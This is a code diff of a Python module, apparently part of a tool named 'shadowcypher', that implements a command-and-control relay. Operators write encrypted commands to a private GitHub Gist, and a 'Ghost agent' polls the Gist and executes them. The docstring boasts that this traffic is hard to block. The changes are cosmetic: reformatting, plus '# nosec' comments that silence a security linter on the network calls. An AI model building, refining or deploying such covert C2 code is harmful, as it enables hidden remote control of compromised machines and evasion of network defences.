@@ -5,7 +5,12 @@ Commands are written to a private Gist as AES-GCM encrypted blobs.
 The Ghost agent polls the Gist, decrypts, and executes.
 Traffic looks like normal GitHub API calls — extremely hard to block.
 """
-import os, json, time, base64, secrets, threading
+import os
+import json
+import time
+import base64
+import secrets
+import threading
 from typing import Optional, Callable
 from shadowcypher.core.logger import logger
 
@@ -58,7 +63,7 @@ class GitHubRelay:
             headers=self._headers(),
         )
         try:
-            with urllib.request.urlopen(req, timeout=10) as r:
+            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                 data = json.loads(r.read())
             self._gist_id = data["id"]
             logger.info("c2_relay", f"Gist C2 created: {self._gist_id}")
@@ -161,7 +166,7 @@ class GitHubRelay:
                 f"{self.API_BASE}/gists/{self._gist_id}",
                 headers=self._headers(),
             )
-            with urllib.request.urlopen(req, timeout=10) as r:
+            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                 data = json.loads(r.read())
             content = data["files"]["data.json"]["content"]
             return json.loads(content)
@@ -180,7 +185,7 @@ class GitHubRelay:
             headers=self._headers(),
         )
         try:
-            urllib.request.urlopen(req, timeout=10)
+            urllib.request.urlopen(req, timeout=10)  # nosec B310
         except Exception as e:
             logger.debug("c2_relay", f"Write error: {e}")
 
@@ -217,8 +222,10 @@ class GitHubRelay:
     def _load_key(self) -> Optional[bytes]:
         env_key = os.environ.get("SHADOWCYPHER_C2_KEY", "")
         if env_key:
-            try: return bytes.fromhex(env_key)
-            except Exception: pass
+            try:
+                return bytes.fromhex(env_key)
+            except Exception:
+                pass
         key_path = os.path.expanduser("~/.shadowcypher/c2_relay.key")
         if os.path.exists(key_path):
             with open(key_path, "rb") as f:
@@ -239,8 +246,10 @@ class GitHubRelay:
     @staticmethod
     def _emit(cb, msg):
         if cb:
-            try: cb(msg)
-            except Exception: pass
+            try:
+                cb(msg)
+            except Exception:
+                pass
 
 
 github_relay = GitHubRelay()
